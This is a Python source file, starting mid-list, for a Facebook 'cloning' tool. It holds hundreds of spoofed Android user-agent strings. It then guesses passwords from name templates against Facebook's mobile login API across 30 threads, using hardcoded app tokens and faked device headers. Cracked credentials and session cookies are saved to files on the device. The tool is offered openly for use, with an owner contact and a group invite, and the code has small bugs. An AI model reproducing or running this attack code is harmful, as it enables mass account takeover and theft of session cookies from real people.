did:Amazon_KFONWI_28;)","Dalvik/2.1.0 (Linux; U; Android 13; V2072A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SC-52A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; KFONWI Build/PS7327.3326N) C4oD_Android/9.6.0 (uid:aa16de38-3bc3-4ff0-b52b-803a42312cfb; tid:-; did:Amazon_KFONWI_28;)","Dalvik/2.1.0 (Linux; U; Android 12; AGS5-W09 Build/HUAWEIAGS5-W09)","Dalvik/2.1.0 (Linux; U; Android 12; moto g200 5G Build/S1RXS32.50-13-17)","Dalvik/2.1.0 (Linux; U; Android 11; PEGM10 Build/RKQ1.201217.002)","Dalvik/2.1.0 (Linux; U; Android 12; 2201117TG Build/SKQ1.211103.001) VD/235","Dalvik/2.1.0 (Linux; U; Android 7.0; Archos 101b Xenon Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; SL104D Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11.0; i13 pro Max Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; moto g52 Build/S1SRS32.38-132-11)","Dalvik/2.1.0 (Linux; U; Android 11; Lenovo TB-Q706F Build/RKQ1.210614.002)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) Build/S1RFS32.27-25-12)","Dalvik/2.1.0 (Linux; U; Android 9; POS-EIBTPDC Build/PI)","Dalvik/2.1.0 (Linux; U; Android 12; SM-E045F Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; Z42 pro Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; MX-A10R Build/S00812)","Dalvik/2.1.0 (Linux; U; Android 11; mt5867 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; PCHM10 Build/RKQ1.200903.002)","Dalvik/2.1.0 (Linux; U; Android 11; R4 Build/RTK2.220814.001)","Dalvik/2.1.0 (Linux; U; Android 11; SmartTV Build/RTM4.220307.159)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042.A1)","Dalvik/2.1.0 (Linux; U; Android 12; A161 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; MAXIMUS 5.0 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; Android 7.1.2; MI 8 SE Build/311vx; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 9; SHV46 Build/PKQ1.190626.001)","Dalvik/2.1.0 (Linux; U; Android 13; NX712J Build/TKQ1.221220.001)","Dalvik/2.1.0 (Linux; U; Android 11; T766H_EEA Build/RP1A.200720.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; 5002E Build/QKQ1.200623.002) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 9; ZTE Blade A3 2020 Build/PPR1.180610.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A145M Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; T5 Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 10; M2003J15SC MIUI/V12.0.10.0.QJOEUXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; Studio Mini 2023 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RH32.20-42-13-2-3)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Viva_1003G_Lite Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 fusion Build/S3SJS32.1-86-2-4)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N971N Build/LMY48Z)","Dalvik/2.1.0 (Linux; U; Android 11; Facilotab L Rubis Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.025)","Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone64_x86_64 Build/TSE5.230214.001)","Dalvik/2.1.0 (Linux; U; Android 11; M40Pro_RUS Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; NLG-QBEX Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Aquaris X5 Plus Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; KFRAWI Build/RS8318.2031N)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-7-11)","Dalvik/2.1.0 (Linux; U; Android 12; V Max Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A505FN Build/RP1A.200720.012) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; S88Pro Build/QP1A.190711.020) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; M2004J19C MIUI/V12.0.4.0.QJCMIXM) VD/235","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TQ2B.230505.005.A1) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; PLUM Z712 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-5-1-5)","Dalvik/2.1.0 (Linux; U; Android 12; RMX2111 Build/SP1A.210812.016) baiduboxapp/13.33.0.11 (Baidu; P1 12) SP-engine/2.71.0 baiduboxapp/13.33.0.11 (Baidu; P1 12) dumedia/7.41.52.13","Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30i 5G Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 12; I1927 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 12; Tab 12 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g42 Build/S2SE32.28-13-1)","Dalvik/2.1.0 (Linux; U; Android 12; Nokia G11 Build/SP1A.210812.016; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 13; I2203 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 6.0; V730 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; Redmi Note 5 Pro Build/SQ3A.220705.003)","Dalvik/2.1.0 (Linux; U; Android 12; Element 5 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia G11 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10.0; pop Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K10C Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; BOOKEEN Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; M10L Pro Build/S00812)","Dalvik/2.1.0 (Linux; U; Android 11; Hisense Infinity H60 Lite Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 12; 2109119DI Build/SKQ1.211006.001) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; 2201117TY Build/SKQ1.211103.001) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 12; CPH2357 Build/SP1A.210812.016) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 11; M2010J19SY Build/RKQ1.201004.002) VD/235","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G Build/RPNS31.Q1-51-40-16-3)","Dalvik/2.1.0 (Linux; U; Android 12; moto g 5G (2022) Build/S2SA32.1-54-17)","Dalvik/2.1.0 (Linux; U; Android 13; SM-F700U Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; 6002D Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision plus Build/PPIS29.65-51-7)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230505.002.A1)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Aquaris M10 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; CRT-LX2 Build/HONORCRT-L32)","Dalvik/2.1.0 (Linux; U; Android 10; 9060G Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9.0; MF-MQX02 Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 12; X20 Build/X20)",])
#def iAmAndroidUa():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	#ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	#END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	#ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)","Dalvik/2.1.0 (Linux; U; Android 9; AFTWMST22 Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 10; 7LC1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.de.6330.d4.software Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; PX1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 50 Cobalt Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 13; PHP110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; V2238 Build/TP1A.220624.014_NONFCMOD1)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T818 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO Mobile CH9n Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; T96R Build/LMY49F)","Dalvik/2.1.0 (Linux; U; Android 7.0; Moto C Build/NRD90M.041)","Dalvik/2.1.0 (Linux; U; Android 13; SH-M24 Build/S3162)","Dalvik/2.1.0 (Linux; U; Android 10.0; T9212A Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 11; AiPlus2K Build/RTM3.211215.123)","Dalvik/2.1.0 (Linux; U; Android 9; SA 2K TV Build/PTO7.211209.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g32 Build/S2SNS32.34-60-6)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SF550 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A536N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230305.008.C1)","Dalvik/2.1.0 (Linux; U; Android 9; Viva_1003G Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; ZTE A2322G Build/SKQ1.220213.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-81-10)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A3460 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; V2239 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; S1 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003)","Dalvik/2.1.0 (Linux; U; Android 13; Bengal for arm64 Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; X12 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2465 Build/RKQ1.211119.001)","Dalvik/2.1.0 (Linux; U; Android 11; Q9.r1.00.6330_642.d4 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 13; Subsystem for Android(TM) Build/TQ2A.230305.008.C1)","Dalvik/2.1.0 (Linux; U; Android 13; TECNO KI7 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; N210 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 5.1; i1002SK Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 11; Hisense E20s Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10; Primo E12 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQ32.20-42-10-1)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; SBM303SH Build/S0034)","Dalvik/2.1.0 (Linux; U; Android 12; V22S Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 8.0.0; Moto Z (2) Build/OPXS27.109-40-22)","Dalvik/2.1.0 (Linux; U; Android 11; AT70K Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-42)","Dalvik/2.1.0 (Linux; U; Android 11; RMX3506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; 21051182C Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC62 Build/61.2.A.0.410)","Dalvik/2.1.0 (Linux; U; Android 11; AQUOS-TVE21A Build/RTM2.210929.167)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; MBX4K Ranger Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G770F Build/TP1A.220624.014; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 10; VOG-TL00 Build/HUAWEIDRA-LX9)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; S23 Ultra Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 9; UK 4K Android TV Build/PTO6.220926.001)","Dalvik/2.1.0 (Linux; U; Android 12; Armor X10 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; LT600T Build/QKQ1.200216.002)","Dalvik/2.1.0 (Linux; U; Android 13; SHG07 Build/S116H)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/T3B2.230316.003)","Dalvik/2.1.0 (Linux; U; Android 5.1; Ixion ES350 Build/DEXP)","Dalvik/2.1.0 (Linux; U; Android 12; ELZ-AN20 Build/HONORELZ-AN20)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RA33.55-15-10)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z012DA Build/MMB29P)","Dalvik/2.1.0 (Linux; U; Android 11; BQru-6868L Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 22031116AI Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; O2 TV Box Build/QTT2.200720.001)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision Build/PSA29.97-37)","Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6P Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2127 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 12; 100071485 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505N Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 10.0; YT7260L Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Gtel X7plus Build/O11019)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; TPS550A Build/KTU84Q)","Dalvik/2.1.0 (Linux; U; Android 10; TC57 Build/10-16-10.00-QG-U133-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris60c Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)","Dalvik/2.1.0 (Linux; U; Android 7.0; SPYBOXSXMINI Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; K55g Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; V2065 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 11; E506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; BNE-LX3 Build/HUAWEIBNE-LX3)","Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)","Dalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)","Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)","Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)","Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)",])+END
	#return ua

	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Cloning Process Has Been Completed ')
			p(' [•] Total OK Accounts : %s '%(len(ok)))
			p(' [•] Total CP Accounts : %s '%(len(cp)))
			line()
			input(' [•] Press Enter To Go Back To Main Menu ')
			self.menu()
	def menu(self):
		logo()
		p('   Use Flight\033[1;90m (airoplane)\033[1;97m Mode For More Ok Ids ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Owner Contact ")
		p(' [3] Whatsapp group join ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open wa.me+923251258612')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp.com/IvaOmDFHYIA2lpSoD9zB9w')
		else:
			p(' [•] Wrong Select ')
			sp(1)
			self.menu()
	def methods_menu(self):
		line()
		p(' [1] Method 1 \n [2] Method 2 \n [3] Method 3')
		line()
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		elif m_2 == '2':
			method.append('ii')
			self.cracking()
		elif m_2 == '3':
			method.append('iii')
			self.cracking()
		else:
			p(' [•] Wrong Select ')
			sp(1)
			self.methods_menu()

	def cracking(self):
		clear()
		logo()
		try:
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()

	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 30 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,last1122,firstlast,last Etc ')
		for n in range(plimit):
			pwx.append(input(' [•] Put Password %s : '%(n+1)))
		clear();logo()
		p('  Use Flight\033[1;90m (airoplane)\033[1;97m Mode For More Ok Ids ')
		line()
		p('  Total ids :  %s '%(len(id)))
		line()
		p('  The Process is running in the background ')
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)

	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [JUTT] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': umair_ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[JUTT-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/JUTT_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/JUTT_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[JUTT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/JUTT_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)

	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [JUTT] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {'adid': 'e794abdd-1229-42af-b583-bb014ff30258', 'format': 'json', 'device_id': '5b81b36f-bc92-4205-aa02-8a391b251963', 'cpl': 'true', 'family_device_id': '4f7f38f1-43a2-461e-a70e-de7dc5836e90', 'credentials_type': 'device_based_login_password', 'email': uid, 'password': pw, 'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': 'c7b7a3c2-d06f-49c4-9db2-4624980bbfc5', 'currently_logged_in_userid': '0', 'locale': 'en_PK', 'client_country_code': 'PK', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361qa98702bf97a021ddc14d'}
				headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; 0 Build/QP1A.667002.570) [FBAN/FB4A;FBAV/311.0.0.2.64;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '39676', 'X-FB-SIM-HNI': '29351', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[JUTT-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/JUTT_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/JUTT_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[JUTT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/JUTT_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)

	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [JUTT] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'email': uid, 'password': pw, 'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_PK', 'client_country_code': 'PK', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361qa98702bf97a021ddc14d'}
				headers = {'User-Agent': umair_ua, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[JUTT-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/JUTT_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/JUTT_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[JUTT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/JUTT_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)

		exit()
